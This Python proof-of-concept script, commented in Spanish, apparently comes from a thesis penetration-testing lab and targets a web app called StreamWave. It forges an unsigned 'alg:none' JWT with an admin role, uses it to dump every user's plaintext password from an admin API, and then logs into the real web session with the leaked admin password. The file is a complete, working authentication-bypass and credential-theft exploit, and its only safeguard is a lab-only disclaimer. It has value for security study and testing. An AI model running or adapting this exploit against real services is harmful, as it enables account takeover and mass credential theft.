#!/usr/bin/env python3
"""
PoC de bypass de autenticacion via JWT "alg:none" en StreamWave (BigShop / TFM).
Ver Hallazgos/F-030 - Bypass de autenticacion JWT (alg none) -> dump de usuarios.

Contexto:
  - /api/me y /api/admin/* usan un sistema de autenticacion paralelo al de la
    web (basado en sesion/cookie): un JWT Bearer, obtenido via
    POST /api/auth/token con username+password, con claim "role".
  - El servidor acepta JWTs con header {"alg":"none"} y SIN firma -- el
    clasico ataque "alg:none": basta con construir un token a mano con el
    "role" que se quiera, sin conocer ningun secreto ni contrasena.
  - Un rol "user" legitimo recibe 403 en /api/admin/users; sin token, 401.
    Solo con un token forjado "role":"admin" (sin firmar) se obtiene 200.
  - /api/admin/users devuelve el listado COMPLETO de usuarios de la
    plataforma con la contrasena **en texto plano** (no hasheada) --
    incluida la del propio admin, verificada contra el login real de sesion.

Que hace este script:
  1. Forja un JWT "alg:none" con role:"admin" (sin necesitar cuenta previa).
  2. Lo usa contra /api/me para confirmar que el rol forjado es aceptado.
  3. Lo usa contra /api/admin/users para volcar la base de usuarios completa.
  4. Si el usuario "admin" aparece en el volcado, intenta iniciar sesion real
     (web, basada en cookie) con esa contrasena filtrada, para confirmar la
     cadena completa hasta una toma de cuenta real.

Uso:
    python3 streamwave_jwt_auth_bypass.py
    python3 streamwave_jwt_auth_bypass.py --base-url http://172.17.0.2:9090
    python3 streamwave_jwt_auth_bypass.py --no-login-check   # solo el dump, sin probar login

Solo para uso en el laboratorio controlado BigShop (TFM), con autorizacion.
No usar contra sistemas sin autorizacion explicita.
"""

import argparse
import base64
import http.cookiejar
import json
import time
import urllib.error
import urllib.request

DEFAULT_BASE_URL = "http://172.17.0.2:9090"
TIMEOUT = 8


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_none_token(sub=999, username="forged_admin", display_name="Forged Admin",
                      role="admin") -> str:
    header = {"alg": "none", "typ": "JWT"}
    now = int(time.time())
    payload = {
        "sub": sub, "username": username, "display_name": display_name,
        "role": role, "iat": now, "exp": now + 86400,
    }
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."  # firma vacia -- esto es lo que hace el ataque posible


def http_json(url, method="GET", headers=None, data=None):
    req = urllib.request.Request(url, method=method, headers=headers or {}, data=data)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, (json.loads(body) if body else None)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, body


def try_session_login(base_url: str, username: str, password: str) -> bool:
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    data = f"username={username}&password={password}".encode()
    req = urllib.request.Request(
        f"{base_url}/login", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with opener.open(req, timeout=TIMEOUT) as resp:
        resp.read()
    with opener.open(urllib.request.Request(f"{base_url}/"), timeout=TIMEOUT) as resp:
        home = resp.read().decode("utf-8", errors="replace")
    # Si el login fallo, la home sigue mostrando "Sign in"; si fue bien, no.
    return "Sign in" not in home.split("</header>")[0] if "</header>" in home else "Sign in" not in home


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL)
    ap.add_argument("--no-login-check", action="store_true",
                     help="No intentar iniciar sesion real con la contrasena de admin filtrada")
    args = ap.parse_args()

    print(f"[*] Objetivo: {args.base_url}\n")

    print("[*] Comprobando que un token legitimo de rol 'user' NO puede acceder a /api/admin/users...")
    status_user, _ = http_json(f"{args.base_url}/api/me")  # sin token -> 401, de control
    status_noauth, _ = http_json(f"{args.base_url}/api/admin/users")
    print(f"    Sin token -> {status_noauth} (esperado: 401)")

    print("\n[*] Forjando un JWT 'alg:none' SIN firma, con role:admin...")
    forged = forge_none_token()
    print(f"    Token forjado: {forged}")

    headers = {"Authorization": f"Bearer {forged}"}
    status_me, body_me = http_json(f"{args.base_url}/api/me", headers=headers)
    print(f"\n[*] GET /api/me con el token forjado -> {status_me}")
    print(f"    {body_me}")

    if status_me != 200 or (isinstance(body_me, dict) and body_me.get("role") != "admin"):
        print("\n[!] El servidor NO acepto el token forjado como admin. "
              "Puede que el fallo ya este corregido.")
        return

    print("\n[+] *** BYPASS DE AUTENTICACION CONFIRMADO: role 'admin' aceptado sin firma ***")

    status_admin, body_admin = http_json(f"{args.base_url}/api/admin/users", headers=headers)
    print(f"\n[*] GET /api/admin/users con el token forjado -> {status_admin}")

    if status_admin != 200 or not isinstance(body_admin, dict):
        print("[!] No se pudo volcar /api/admin/users.")
        return

    users = body_admin.get("users", [])
    print(f"\n[+] *** {len(users)} USUARIOS VOLCADOS, CONTRASENAS EN TEXTO PLANO ***\n")
    print(f"{'id':<4}{'username':<28}{'password':<20}{'display_name'}")
    print("-" * 80)
    admin_creds = None
    for u in users:
        print(f"{u['id']:<4}{u['username']:<28}{u['password']:<20}{u.get('display_name','')}")
        if u["username"] == "admin":
            admin_creds = (u["username"], u["password"])

    status_videos, body_videos = http_json(f"{args.base_url}/api/admin/videos", headers=headers)
    if status_videos == 200 and isinstance(body_videos, dict):
        vids = body_videos.get("videos", [])
        private = [v for v in vids if v.get("visibility") == "private"]
        print(f"\n[+] Bonus: GET /api/admin/videos tambien accesible -> {len(vids)} videos "
              f"({len(private)} privados, visibles aqui sin necesitar el IDOR de F-026).")

    if args.no_login_check or not admin_creds:
        return

    print(f"\n[*] Probando iniciar sesion REAL (web, por cookie) con la cuenta 'admin' "
          f"y la contrasena filtrada...")
    ok = try_session_login(args.base_url, *admin_creds)
    if ok:
        print(f"[+] *** LOGIN REAL CONFIRMADO: admin / {admin_creds[1]} funciona. "
              f"Cadena completa: JWT forjado -> dump de usuarios -> toma de cuenta admin real. ***")
    else:
        print("[!] El login con esas credenciales no parecio funcionar (puede haber cambiado la contrasena).")


if __name__ == "__main__":
    main()
